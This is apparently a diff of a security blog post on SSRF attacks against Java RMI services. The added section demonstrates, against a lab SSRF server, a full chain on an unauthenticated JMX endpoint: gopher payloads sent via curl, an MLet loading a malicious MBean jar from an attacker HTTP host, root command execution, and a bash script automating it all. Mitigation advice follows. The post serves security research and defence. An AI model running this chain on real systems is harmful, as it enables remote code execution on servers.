@@ -9,6 +9,7 @@ tags:
 - ssrf
 - java rmi
 - remote-method-guesser
+- beanshooter
 
 categories:
 - java
@@ -139,7 +140,7 @@ Another problem we have not talked about so far are data types. It should be obv
 *SSRF* vulnerability cannot be utilized to perform *SSRF* attacks on *RMI* services. Already the first few bytes
 (*RMI Magic*) would cause an corrupted stream and lead to an error on the *RMI* service. Instead, you need to be
 able to send arbitrary bytes to the target *RMI service*, which is an annoying restriction. Especially null bytes need
-to be allowed, which causes problems even with *gopher* based *SSRF* attacks on newer curl versions \[[1](https://www.digeex.de/blog/tinytinyrss/)\].
+to be allowed, which causes problems even with *gopher* based *SSRF* attacks on newer curl versions [\[1\]](#references).
 However, when this condition is met and you can send arbitrary data to the *RMI* service, you can dispatch
 calls as with a direct connection.
 
@@ -174,8 +175,8 @@ rare, but when all conditions are met, you can consume any *RMI* service as with
 
 To demonstrate the *SSRFibility* of the *Java RMI* protocol, we will now attack an *RMI registry* endpoint using a
 webapplication that is vulnerable to *SSRF* attacks. In order to make this as comfortable as possible, we use *remote-method-guesser*
-\[[2](https://github.com/qtc-de/remote-method-guesser)\], a *Java RMI* vulnerability scanner with integrated *SSRF* support.
-The *remote-method-guesser* repository also contains an *SSRF* example server \[[3](https://github.com/qtc-de/remote-method-guesser/pkgs/container/remote-method-guesser%2Frmg-ssrf-server)\]
+[\[2\]](#references), a *Java RMI* vulnerability scanner with integrated *SSRF* support.
+The *remote-method-guesser* repository also contains an *SSRF* example server [\[3\]](#references)
 that we can use for demonstration purposes. The setup for the following demonstration looks like this:
 
 * *HTTP* service vulnerable to *SSRF* within the ``url`` parameter on ``http://172.17.0.2:8000``
@@ -276,7 +277,7 @@ shows all of the above mentioned steps in action:
 ![RMI SSRF Example](https://tneitzel.eu/73201a92878c0aba7c3419b7403ab604/ssrf.gif)
 
 
-### Attacking a Custom RMI Service
+### Attacking Custom RMI Services
 
 The ssrf-server [3](https://github.com/qtc-de/remote-method-guesser/pkgs/container/remote-method-guesser%2Frmg-ssrf-server) from
 the *remote-method-guesser* repository runs one custom *RMI service* that is, like the *RMI registry*, only reachable from localhost.
@@ -394,18 +395,18 @@ curl_user:x:100:101:Linux User,,,:/home/curl_user:/sbin/nologin
 *JMX* is probably one of the most well known *RMI services* and is usually a reliable and easy target for attackers.
 Instead of securing *JMX* services correctly with user authentication or client certificates, administrators often
 take the easy route and prevent access to *JMX* services from untrusted networks. This makes *SSRF* attacks on *JMX*
-endpoints and interesting topic, as it may allows to attack unreachable *JMX* endpoints. 
+endpoints an interesting topic, as it may allows to attack unreachable *JMX* endpoints.
 
 From the *SSRF* perspective, *JMX* is very similar to the custom *RMI service* discussed before. Despite being a well
 known service, *JMX* endpoints do not have a fixed ``ObjID`` value. A ``lookup`` operation on the *RMI registry* is
-therefore usually required to interact with the *JMX remote object*. Furthermore, there is one special characteristic
+therefore required to interact with the *JMX remote object*. Furthermore, there is one special characteristic
 that we have not encountered so far and this is *session management*.
 
 *JMX* supports password protected endpoints and needs therefore to implement *session management*. The *RMI protocol*
-has no built in support for *session management*, but it is a common practice to use the ``ObjID`` mechanism for implicit
+has no built in support for *session management*, but it is a common practice to use the ``ObjID`` mechanism for
 session management. We already said that custom *remote objects* get assigned a randomly generated ``ObjID`` value during
 export and that clients are unable to use the *remote objects* without knowing their ``ObjID``. To make *remote objects*
-publicly available, you bind them to an *RMI registry* service, but without doing this, the *remote object* can only be
+publicly available, one binds them to an *RMI registry* service, but without doing this, the *remote object* can only be
 accessed by clients that somehow obtained the ``ObjID`` value.
 
 When a client wants to connect to a *JMX* service, it first looks up the corresponding bound name within the *RMI registry*.
@@ -422,7 +423,7 @@ public interface RMIServer extends Remote {
 To interact with the *JMX* agent, clients need to obtain a *remote object* that implements the ``RMIConnection`` interface.
 Such an object is returned when the client calls the ``newClient`` method and supplies the correct credentials. In this case,
 the initial entry point object that implements the ``RMIServer`` interface exports a new *remote object* that implements the
-``RMIConnection`` interface. Instead of binding the result to an *RMI registry* where it could be looked up by everyone, a
+``RMIConnection`` interface. Instead of binding the result to an *RMI registry*, where it could be looked up by everyone, a
 reference to the *remote object* is returned to the client that called the ``newClient`` method. The client is then the only
 one who obtained the ``ObjID`` value for the new *remote object* and no other clients can interact with it. This demonstrates
 how ``ObjID`` values can yield as a *session id* equivalent.
@@ -436,13 +437,192 @@ When targeting *JMX* services via *SSRF*, the *session management* adds one addi
     * Use *MLet* to load a malicious *MBean*
     * Use the malicious *MBean* to achieve *RCE*
 
-Notice that the third step needs to be executed in a short time interval after the second step. After obtaining a reference
+Notice that the third step needs to be executed in a short time interval after the second step. When obtaining a reference
 to the *remote object* that implements the ``RMIConnection`` interface, a real client would send a corresponding notification
 to the *Distributed Garbage Collector* (*DGC*). This informs the *DGC* that the corresponding *remote object* is in use and
 should not be cleaned up. Since we obtain the reference via *SSRF*, there is no communication to the *DGC*. Shortly after the
 ``newClient`` call has generated the new *remote object*, it will be cleaned up by the *DGC*. Therefore, we need to be fast to
 communicate to it.
 
+
+The first thing we need to do is again to obtain the ``ObjID`` and the *TCP port* of the entry point *JMX remote object*.
+This is done in the same way as we did for the custom *RMI* service:
+
+```console
+$ rmg enum 127.0.0.1 1090 --scan-action list --bound-name jmxrmi --ssrf --gopher --encode
+[+] SSRF Payload: gopher%3A%2F%2F127.0.0.1%3A1090%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2502%2544%2515%254d%25c9%25d4%25e6%253b%25df%2574%2500%2506%256a%256d%2578%2572%256d%2569
+$ curl 'http://172.17.0.2:8000?url=gopher%3A%2F%2F127.0.0.1%3A1090%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2502%2544%2515%254d%25c9%25d4%25e6%253b%25df%2574%2500%2506%256a%256d%2578%2572%256d%2569' --silent | xxd -p -c10000
+4e00093132372e302e302e31000098a251aced0005770f0132a61f2f0000017de0c0d31680067372002e6a617661782e6d616e6167656d656e742e72656d6f74652e726d692e524d49536572766572496d706c5f53747562000000000000000202000074002f687474703a2f2f6c6f63616c686f73743a383030302f726d692d636c6173732d646566696e6974696f6e732e6a61727872001a6a6176612e726d692e7365727665722e52656d6f746553747562e9fedcc98be1651a02000071007e00017872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000071007e000178707734000b556e6963617374526566320000096c6f63616c686f73740000894368ba7b5c1455e10832a61f2f0000017de0c0d31680020178
+$ rmg enum 127.0.0.1 1090 --scan-action list --bound-name jmxrmi --ssrf-response 4e00093132372e302e302e31000098a251aced0005770f0132a61f2f0000017de0c0d31680067372002e6a617661782e6d616e6167656d656e742e72656d6f74652e726d692e524d49536572766572496d706c5f53747562000000000000000202000074002f687474703a2f2f6c6f63616c686f73743a383030302f726d692d636c6173732d646566696e6974696f6e732e6a61727872001a6a6176612e726d692e7365727665722e52656d6f746553747562e9fedcc98be1651a02000071007e00017872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000071007e000178707734000b556e6963617374526566320000096c6f63616c686f73740000894368ba7b5c1455e10832a61f2f0000017de0c0d31680020178
+[+] RMI registry bound names:
+[+]
+[+] 	- jmxrmi
+[+] 		--> javax.management.remote.rmi.RMIServerImpl_Stub (known class: JMX Server)
+[+] 		    Endpoint: localhost:35139 ObjID: [32a61f2f:17de0c0d316:-7ffe, 7546479761021067528]
+[+]
+[+] RMI server codebase enumeration:
+[+]
+[+] 	- http://localhost:8000/rmi-class-definitions.ja
+```
+
+Now we know that the *remote object* listens on ``localhost:35139`` with an ``ObjID`` value of ``[32a61f2f:17de0c0d316:-7ffe, 7546479761021067528]``.
+This information is sufficient to call the ``newClient`` method on the *remote object*. We expect the *JMX* service to allow unauthenticated connections
+and pass ``null`` for the required *credential* argument. Furthermore, we can use the ``GenericPrint`` [\[4\]](#references)
+plugin of *remote-method-guesser* to format the return value of the ``newCall`` method in a human readable way:
+
+```console
+$ rmg call 127.0.0.1 35139 null --objid '[32a61f2f:17de0c0d316:-7ffe, 7546479761021067528]' --signature 'javax.management.remote.rmi.RMIConnection newClient(Object creds)' --ssrf --encode --gopher
+[+] SSRF Payload: gopher%3A%2F%2F127.0.0.1%3A35139%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2568%25ba%257b%255c%2514%2555%25e1%2508%2532%25a6%251f%252f%2500%2500%2501%257d%25e0%25c0%25d3%2516%2580%2502%25ff%25ff%25ff%25ff%25f0%25e0%2574%25ea%25ad%250c%25ae%25a8%2570
+$ curl 'http://172.17.0.2:8000?url=gopher%3A%2F%2F127.0.0.1%3A35139%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2568%25ba%257b%255c%2514%2555%25e1%2508%2532%25a6%251f%252f%2500%2500%2501%257d%25e0%25c0%25d3%2516%2580%2502%25ff%25ff%25ff%25ff%25f0%25e0%2574%25ea%25ad%250c%25ae%25a8%2570' --silent | xxd -p -c10000
+$ rmg call 127.0.0.1 35139 null --objid '[32a61f2f:17de0c0d316:-7ffe, 7546479761021067528]' --signature 'javax.management.remote.rmi.RMIConnection newClient(Object creds)' --plugin GenericPrint.jar --ssrf-response 4e00093132372e302e302e310000da5651aced0005770f0132a61f2f0000017de0c0d3168008737200326a617661782e6d616e6167656d656e742e72656d6f74652e726d692e524d49436f6e6e656374696f6e496d706c5f53747562000000000000000202000074002f687474703a2f2f6c6f63616c686f73743a383030302f726d692d636c6173732d646566696e6974696f6e732e6a61727872001a6a6176612e726d692e7365727665722e52656d6f746553747562e9fedcc98be1651a02000071007e00017872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000071007e000178707734000b556e6963617374526566320000096c6f63616c686f7374000089436ff2350a8b9f4f9832a61f2f0000017de0c0d31680070178
+[+] Printing RemoteObject:
+[+] 	Remote Class:            javax.management.remote.rmi.RMIConnectionImpl_Stub
+[+] 	Endpoint:                localhost:35139
+[+] 	ObjID:                   [32a61f2f:17de0c0d316:-7ff9, 8066568201982398360]
+[+] 	ClientSocketFactory:     default
+[+] 	ServerSocketFactory:     default
+```
+
+The call was successful and we obtained a reference to a new *remote object*. This new *remote object* implements the ``RMIConnection`` interface
+and we can perform *JMX* operations on it. To achieve *remote code execution*, we first need to create the *MLet MBean*:
+
+```console
+$ rmg call localhost 35139 '"javax.management.loading.MLet", null, null' --signature 'javax.management.ObjectInstance createMBean(String className, javax.management.ObjectName name, javax.security.auth.Subject delegationSubject)' --objid '[32a61f2f:17de0c0d316:-7ff9, 8066568201982398360]' --ssrf --gopher --encode
+[+] SSRF Payload: gopher%3A%2F%2Flocalhost%3A35139%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%256f%25f2%2535%250a%258b%259f%254f%2598%2532%25a6%251f%252f%2500%2500%2501%257d%25e0%25c0%25d3%2516%2580%2507%25ff%25ff%25ff%25ff%2522%25d7%25fd%254a%2590%256a%25c8%25e6%2574%2500%251d%256a%2561%2576%2561%2578%252e%256d%2561%256e%2561%2567%2565%256d%2565%256e%2574%252e%256c%256f%2561%2564%2569%256e%2567%252e%254d%254c%2565%2574%2570%2570
+$ curl 'http://172.17.0.2:8000?url=gopher%3A%2F%2Flocalhost%3A35139%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%256f%25f2%2535%250a%258b%259f%254f%2598%2532%25a6%251f%252f%2500%2500%2501%257d%25e0%25c0%25d3%2516%2580%2507%25ff%25ff%25ff%25ff%2522%25d7%25fd%254a%2590%256a%25c8%25e6%2574%2500%251d%256a%2561%2576%2561%2578%252e%256d%2561%256e%2561%2567%2565%256d%2565%256e%2574%252e%256c%256f%2561%2564%2569%256e%2567%252e%254d%254c%2565%2574%2570%2570' &>/dev/null
+```
+
+Afterwards, we can use the *MLet MBean* to load a malicious *MBean* using the ``getMBeansFromURL`` method. To create the required payload and the *HTTP* listener,
+we use *beanshooter* [\[5\]](#references) with it's ``--stager-only`` option:
+
+```console
+$ rmg call localhost 35139 'new javax.management.ObjectName("DefaultDomain:type=MLet"), "getMBeansFromURL", new java.rmi.MarshalledObject(new Object[] {"http://172.17.0.1:8000/mlet"}), new String[] { String.class.getName() }, null' --signature 'Object invoke(javax.management.ObjectName name, String operationName, java.rmi.MarshalledObject params, String signature[], javax.security.auth.Subject delegationSubject)' --objid '[32a61f2f:17de0c0d316:-7ff9, 8066568201982398360]' --ssrf --gopher --encode
+[+] SSRF Payload: gopher%3A%2F%2Flocalhost%3A35139%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%256f%25f2%2535%250a%258b%259f%254f%2598%2532%25a6%251f%252f%2500%2500%2501%257d%25e0%25c0%25d3%2516%2580%2507%25ff%25ff%25ff%25ff%2513%25e7%25d6%2594%2517%25e5%25da%2520%2573%2572%2500%251b%256a%2561%2576%2561%2578%252e%256d%2561%256e%2561%2567%2565%256d%2565%256e%2574%252e%254f%2562%256a%2565%2563%2574%254e%2561%256d%2565%250f%2503%25a7%251b%25eb%256d%2515%25cf%2503%2500%2500%2570%2578%2570%2574%2500%2517%2544%2565%2566%2561%2575%256c%2574%2544%256f%256d%2561%2569%256e%253a%2574%2579%2570%2565%253d%254d%254c%2565%2574%2578%2574%2500%2510%2567%2565%2574%254d%2542%2565%2561%256e%2573%2546%2572%256f%256d%2555%2552%254c%2573%2572%2500%2519%256a%2561%2576%2561%252e%2572%256d%2569%252e%254d%2561%2572%2573%2568%2561%256c%256c%2565%2564%254f%2562%256a%2565%2563%2574%257c%25bd%251e%2597%25ed%2563%25fc%253e%2502%2500%2503%2549%2500%2504%2568%2561%2573%2568%255b%2500%2508%256c%256f%2563%2542%2579%2574%2565%2573%2574%2500%2502%255b%2542%255b%2500%2508%256f%2562%256a%2542%2579%2574%2565%2573%2571%2500%257e%2500%2505%2570%2578%2570%2534%257d%25b9%254a%2570%2575%2572%2500%2502%255b%2542%25ac%25f3%2517%25f8%2506%2508%2554%25e0%2502%2500%2500%2570%2578%2570%2500%2500%2500%254a%25ac%25ed%2500%2505%2575%2572%2500%2513%255b%254c%256a%2561%2576%2561%252e%256c%2561%256e%2567%252e%254f%2562%256a%2565%2563%2574%253b%2590%25ce%2558%259f%2510%2573%2529%256c%2502%2500%2500%2578%2570%2500%2500%2500%2501%2574%2500%251b%2568%2574%2574%2570%253a%252f%252f%2531%2537%2532%252e%2531%2537%252e%2530%252e%2531%253a%2538%2530%2530%2530%252f%256d%256c%2565%2574%2575%2572%2500%2513%255b%254c%256a%2561%2576%2561%252e%256c%2561%256e%2567%252e%2553%2574%2572%2569%256e%2567%253b%25ad%25d2%2556%25e7%25e9%251d%257b%2547%2502%2500%2500%2570%2578%2570%2500%2500%2500%2501%2574%2500%2510%256a%2561%2576%2561%252e%256c%2561%256e%2567%252e%2553%2574%2572%2569%256e%2567%2570
+$ curl 'http://172.17.0.2:8000?url=gopher%3A%2F%2Flocalhost%3A35139%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%256f%25f2%2535%250a%258b%259f%254f%2598%2532%25a6%251f%252f%2500%2500%2501%257d%25e0%25c0%25d3%2516%2580%2507%25ff%25ff%25ff%25ff%2513%25e7%25d6%2594%2517%25e5%25da%2520%2573%2572%2500%251b%256a%2561%2576%2561%2578%252e%256d%2561%256e%2561%2567%2565%256d%2565%256e%2574%252e%254f%2562%256a%2565%2563%2574%254e%2561%256d%2565%250f%2503%25a7%251b%25eb%256d%2515%25cf%2503%2500%2500%2570%2578%2570%2574%2500%2517%2544%2565%2566%2561%2575%256c%2574%2544%256f%256d%2561%2569%256e%253a%2574%2579%2570%2565%253d%254d%254c%2565%2574%2578%2574%2500%2510%2567%2565%2574%254d%2542%2565%2561%256e%2573%2546%2572%256f%256d%2555%2552%254c%2573%2572%2500%2519%256a%2561%2576%2561%252e%2572%256d%2569%252e%254d%2561%2572%2573%2568%2561%256c%256c%2565%2564%254f%2562%256a%2565%2563%2574%257c%25bd%251e%2597%25ed%2563%25fc%253e%2502%2500%2503%2549%2500%2504%2568%2561%2573%2568%255b%2500%2508%256c%256f%2563%2542%2579%2574%2565%2573%2574%2500%2502%255b%2542%255b%2500%2508%256f%2562%256a%2542%2579%2574%2565%2573%2571%2500%257e%2500%2505%2570%2578%2570%2534%257d%25b9%254a%2570%2575%2572%2500%2502%255b%2542%25ac%25f3%2517%25f8%2506%2508%2554%25e0%2502%2500%2500%2570%2578%2570%2500%2500%2500%254a%25ac%25ed%2500%2505%2575%2572%2500%2513%255b%254c%256a%2561%2576%2561%252e%256c%2561%256e%2567%252e%254f%2562%256a%2565%2563%2574%253b%2590%25ce%2558%259f%2510%2573%2529%256c%2502%2500%2500%2578%2570%2500%2500%2500%2501%2574%2500%251b%2568%2574%2574%2570%253a%252f%252f%2531%2537%2532%252e%2531%2537%252e%2530%252e%2531%253a%2538%2530%2530%2530%252f%256d%256c%2565%2574%2575%2572%2500%2513%255b%254c%256a%2561%2576%2561%252e%256c%2561%256e%2567%252e%2553%2574%2572%2569%256e%2567%253b%25ad%25d2%2556%25e7%25e9%251d%257b%2547%2502%2500%2500%2570%2578%2570%2500%2500%2500%2501%2574%2500%2510%256a%2561%2576%2561%252e%256c%2561%256e%2567%252e%2553%2574%2572%2569%256e%2567%2570' &>/dev/null
+$ beanshooter --stager-only --stager-host 172.17.0.1 --stager-port 8000
+[+] Creating HTTP server on: 172.17.0.1:8000
+[+] 	Creating MLetHandler for endpoint: /mlet
+[+] 	Creating JarHandler for endpoint: /tonka-bean.jar
+[+] 	Starting HTTP server... 
+[+] 	
+[+] Press Enter to stop listening...
+[+]
+[+] Received request for: /mlet
+[+] Sending malicious mlet:
+[+] 
+[+] 	Class:		de.qtc.tonkabean.TonkaBean
+[+] 	Archive:	tonka-bean.jar
+[+] 	Object:		MLetTonkaBean:name=TonkaBean,id=1
+[+] 	Codebase:	http://172.17.0.1:8000
+[+] 	
+[+] Received request for: /tonka-bean.jar
+[+] Sending malicious jar file... done!
+```
+
+The malicious *MBean* that we deployed supports an ``executeCommand`` method that can be used to execute operation system commands.
+We can now trigger this method by using the *SSRF* vulnerability:
+
+```console
+$ rmg call localhost 35139 'new javax.management.ObjectName("MLetTonkaBean:name=TonkaBean,id=1"), "executeCommand", new java.rmi.MarshalledObject(new Object[] {"id"}), new String[] { String.class.getName() }, null' --signature 'Object invoke(javax.management.ObjectName name, String operationName, java.rmi.MarshalledObject params, String signature[], javax.security.auth.Subject delegationSubject)' --objid '[32a61f2f:17de0c0d316:-7ff9, 8066568201982398360]' --ssrf --gopher --encode
+[+] SSRF Payload: gopher%3A%2F%2Flocalhost%3A35139%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%256f%25f2%2535%250a%258b%259f%254f%2598%2532%25a6%251f%252f%2500%2500%2501%257d%25e0%25c0%25d3%2516%2580%2507%25ff%25ff%25ff%25ff%2513%25e7%25d6%2594%2517%25e5%25da%2520%2573%2572%2500%251b%256a%2561%2576%2561%2578%252e%256d%2561%256e%2561%2567%2565%256d%2565%256e%2574%252e%254f%2562%256a%2565%2563%2574%254e%2561%256d%2565%250f%2503%25a7%251b%25eb%256d%2515%25cf%2503%2500%2500%2570%2578%2570%2574%2500%2521%254d%254c%2565%2574%2554%256f%256e%256b%2561%2542%2565%2561%256e%253a%256e%2561%256d%2565%253d%2554%256f%256e%256b%2561%2542%2565%2561%256e%252c%2569%2564%253d%2531%2578%2574%2500%250e%2565%2578%2565%2563%2575%2574%2565%2543%256f%256d%256d%2561%256e%2564%2573%2572%2500%2519%256a%2561%2576%2561%252e%2572%256d%2569%252e%254d%2561%2572%2573%2568%2561%256c%256c%2565%2564%254f%2562%256a%2565%2563%2574%257c%25bd%251e%2597%25ed%2563%25fc%253e%2502%2500%2503%2549%2500%2504%2568%2561%2573%2568%255b%2500%2508%256c%256f%2563%2542%2579%2574%2565%2573%2574%2500%2502%255b%2542%255b%2500%2508%256f%2562%256a%2542%2579%2574%2565%2573%2571%2500%257e%2500%2505%2570%2578%2570%25c7%25c0%253e%25a2%2570%2575%2572%2500%2502%255b%2542%25ac%25f3%2517%25f8%2506%2508%2554%25e0%2502%2500%2500%2570%2578%2570%2500%2500%2500%2531%25ac%25ed%2500%2505%2575%2572%2500%2513%255b%254c%256a%2561%2576%2561%252e%256c%2561%256e%2567%252e%254f%2562%256a%2565%2563%2574%253b%2590%25ce%2558%259f%2510%2573%2529%256c%2502%2500%2500%2578%2570%2500%2500%2500%2501%2574%2500%2502%2569%2564%2575%2572%2500%2513%255b%254c%256a%2561%2576%2561%252e%256c%2561%256e%2567%252e%2553%2574%2572%2569%256e%2567%253b%25ad%25d2%2556%25e7%25e9%251d%257b%2547%2502%2500%2500%2570%2578%2570%2500%2500%2500%2501%2574%2500%2510%256a%2561%2576%2561%252e%256c%2561%256e%2567%252e%2553%2574%2572%2569%256e%2567%2570
+$ curl 'http://172.17.0.2:8000?url=gopher%3A%2F%2Flocalhost%3A35139%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%256f%25f2%2535%250a%258b%259f%254f%2598%2532%25a6%251f%252f%2500%2500%2501%257d%25e0%25c0%25d3%2516%2580%2507%25ff%25ff%25ff%25ff%2513%25e7%25d6%2594%2517%25e5%25da%2520%2573%2572%2500%251b%256a%2561%2576%2561%2578%252e%256d%2561%256e%2561%2567%2565%256d%2565%256e%2574%252e%254f%2562%256a%2565%2563%2574%254e%2561%256d%2565%250f%2503%25a7%251b%25eb%256d%2515%25cf%2503%2500%2500%2570%2578%2570%2574%2500%2521%254d%254c%2565%2574%2554%256f%256e%256b%2561%2542%2565%2561%256e%253a%256e%2561%256d%2565%253d%2554%256f%256e%256b%2561%2542%2565%2561%256e%252c%2569%2564%253d%2531%2578%2574%2500%250e%2565%2578%2565%2563%2575%2574%2565%2543%256f%256d%256d%2561%256e%2564%2573%2572%2500%2519%256a%2561%2576%2561%252e%2572%256d%2569%252e%254d%2561%2572%2573%2568%2561%256c%256c%2565%2564%254f%2562%256a%2565%2563%2574%257c%25bd%251e%2597%25ed%2563%25fc%253e%2502%2500%2503%2549%2500%2504%2568%2561%2573%2568%255b%2500%2508%256c%256f%2563%2542%2579%2574%2565%2573%2574%2500%2502%255b%2542%255b%2500%2508%256f%2562%256a%2542%2579%2574%2565%2573%2571%2500%257e%2500%2505%2570%2578%2570%25c7%25c0%253e%25a2%2570%2575%2572%2500%2502%255b%2542%25ac%25f3%2517%25f8%2506%2508%2554%25e0%2502%2500%2500%2570%2578%2570%2500%2500%2500%2531%25ac%25ed%2500%2505%2575%2572%2500%2513%255b%254c%256a%2561%2576%2561%252e%256c%2561%256e%2567%252e%254f%2562%256a%2565%2563%2574%253b%2590%25ce%2558%259f%2510%2573%2529%256c%2502%2500%2500%2578%2570%2500%2500%2500%2501%2574%2500%2502%2569%2564%2575%2572%2500%2513%255b%254c%256a%2561%2576%2561%252e%256c%2561%256e%2567%252e%2553%2574%2572%2569%256e%2567%253b%25ad%25d2%2556%25e7%25e9%251d%257b%2547%2502%2500%2500%2570%2578%2570%2500%2500%2500%2501%2574%2500%2510%256a%2561%2576%2561%252e%256c%2561%256e%2567%252e%2553%2574%2572%2569%256e%2567%2570' --silent | xxd -p -c10000
+4e00093132372e302e302e310000da6851aced0005770f0132a61f2f0000017de0c0d316800b7400827569643d3028726f6f7429206769643d3028726f6f74292067726f7570733d3028726f6f74292c312862696e292c32286461656d6f6e292c3328737973292c342861646d292c36286469736b292c313028776865656c292c313128666c6f707079292c3230286469616c6f7574292c32362874617065292c323728766964656f290a
+$ rmg call localhost 35139 'new javax.management.ObjectName("MLetTonkaBean:name=TonkaBean,id=1"), "executeCommand", new java.rmi.MarshalledObject(new Object[] {"id"}), new String[] { String.class.getName() }, null' --signature 'Object invoke(javax.management.ObjectName name, String operationName, java.rmi.MarshalledObject params, String signature[], javax.security.auth.Subject delegationSubject)' --objid '[32a61f2f:17de0c0d316:-7ff9, 8066568201982398360]' --plugin GenericPrint.jar --ssrf-response 4e00093132372e302e302e310000da6851aced0005770f0132a61f2f0000017de0c0d316800b7400827569643d3028726f6f7429206769643d3028726f6f74292067726f7570733d3028726f6f74292c312862696e292c32286461656d6f6e292c3328737973292c342861646d292c36286469736b292c313028776865656c292c313128666c6f707079292c3230286469616c6f7574292c32362874617065292c323728766964656f290a
+[+] uid=0(root) gid=0(root) groups=0(root)
+```
+
+Executing all these steps in time before the *JMX remote object* gets garbage collected is pretty difficult. The following
+simple *bash* script can be used to automate the process:
+
+```bash
+#!/bin/bash
+
+SIG_NEW_CLIENT='javax.management.remote.rmi.RMIConnection newClient(Object creds)'
+SIG_CREATE_BEAN='javax.management.ObjectInstance createMBean(String className, javax.management.ObjectName name, javax.security.auth.Subject delegationSubject)'
+SIG_INVOKE='Object invoke(javax.management.ObjectName name, String operationName, java.rmi.MarshalledObject params, String signature[], javax.security.auth.Subject delegationSubject)'
+
+ARG_CREATE_BEAN='"javax.management.loading.MLet", null, null'
+ARG_FROM_URL='new javax.management.ObjectName("DefaultDomain:type=MLet"), "getMBeansFromURL", new java.rmi.MarshalledObject(new Object[] {"http://172.17.0.1:8000/mlet"}), new String[] { String.class.getName() }, null'
+ARG_EXEC='new javax.management.ObjectName("MLetTonkaBean:name=TonkaBean,id=1"), "executeCommand", new java.rmi.MarshalledObject(new Object[] {"id"}), new String[] { String.class.getName() }, null'
+
+function ssrf() {
+    curl "http://172.17.0.2:8000?url=$1" --silent | xxd -p -c10000
+}
+
+echo "[+] Performing lookup operation... "
+PAYLOAD=$(rmg enum 127.0.0.1 1090 --scan-action list --bound-name jmxrmi --ssrf --gopher --encode --raw)
+RESULT=$(ssrf "${PAYLOAD}")
+
+echo "[+]   Parsing lookup result... "
+PARSED=$(rmg enum 127.0.0.1 1090 --scan-action list --bound-name jmxrmi --no-color --ssrf-response "${RESULT}")
+JMX_PORT=$(echo "${PARSED}" | head -n 5 | tail -n1 | cut -f3 -d':' | cut -f1 -d' ')
+OBJID="[$(echo "${PARSED}" | head -n 5 | tail -n1 | cut -f3 -d'[')"
+echo "[+]   JMX Port: ${JMX_PORT}"
+echo "[+]   JMX ObjID: ${OBJID}"
+
+echo "[+] Calling newClient()..."
+PAYLOAD=$(rmg call 127.0.0.1 ${JMX_PORT} 'null' --objid "${OBJID}" --signature "${SIG_NEW_CLIENT}" --ssrf --encode --gopher --raw)
+RESULT=$(ssrf "${PAYLOAD}")
+
+echo "[+]   Parsing newClient() result..."
+RESULT=$(rmg call 127.0.0.1 ${JMX_PORT} 'null' --objid "${OBJID}" --signature "${SIG_NEW_CLIENT}" --plugin GenericPrint.jar --no-color --ssrf-response "${RESULT}")
+OBJID="[$(echo "${RESULT}" | head -n 4 | tail -n 1 | cut -f3 -d'[')"
+echo "[+]   Obtained ObjID: ${OBJID}"
+
+echo "[+] Deploying MLet..."
+PAYLOAD=$(rmg call localhost ${JMX_PORT} "${ARG_CREATE_BEAN}" --signature "${SIG_CREATE_BEAN}" --objid "${OBJID}" --ssrf --gopher --encode --raw)
+ssrf "${PAYLOAD}" &> /dev/null
+
+echo "[+] Calling getMBeansFromURL()..."
+PAYLOAD=$(rmg call localhost ${JMX_PORT} "${ARG_FROM_URL}" --signature "${SIG_INVOKE}" --objid "${OBJID}" --ssrf --gopher --encode --raw)
+ssrf "${PAYLOAD}" &> /dev/null
+
+echo '[+] Calling execute("id"): '
+PAYLOAD=$(rmg call localhost ${JMX_PORT} "${ARG_EXEC}" --signature "${SIG_INVOKE}" --objid "${OBJID}" --ssrf --gopher --encode --raw)
+RESULT=$(ssrf "${PAYLOAD}")
+
+rmg call localhost ${JMX_PORT} "${ARG_EXEC}" --signature "${SIG_INVOKE}" --objid "${OBJID}" --ssrf-response ${RESULT} --plugin GenericPrint.jar
+```
+
+
+### Mitigations
+
+----
+
+Preventing *Server Side Request Forgery* is a topic on it's own and several useful resources are available [\[5\]\[6\]\[7\]](#references).
+However, the attack types discussed in this article demonstrate why it is so important to secure backend services as well. With only a
+few configuration changes, none of the above discussed attacks would have worked. So here are some recommendations for securing *RMI services*:
+
+1. Make sure you use an up to date version of *Java*. The security level of *Java RMI* is constantly improving and outdated
+   *Java* versions often contain known vulnerabilities. If you are not able to update, you should at least evaluate your current
+   security level by looking for known vulnerabilities for your installed *Java* version and usage of vulnerability scanners like
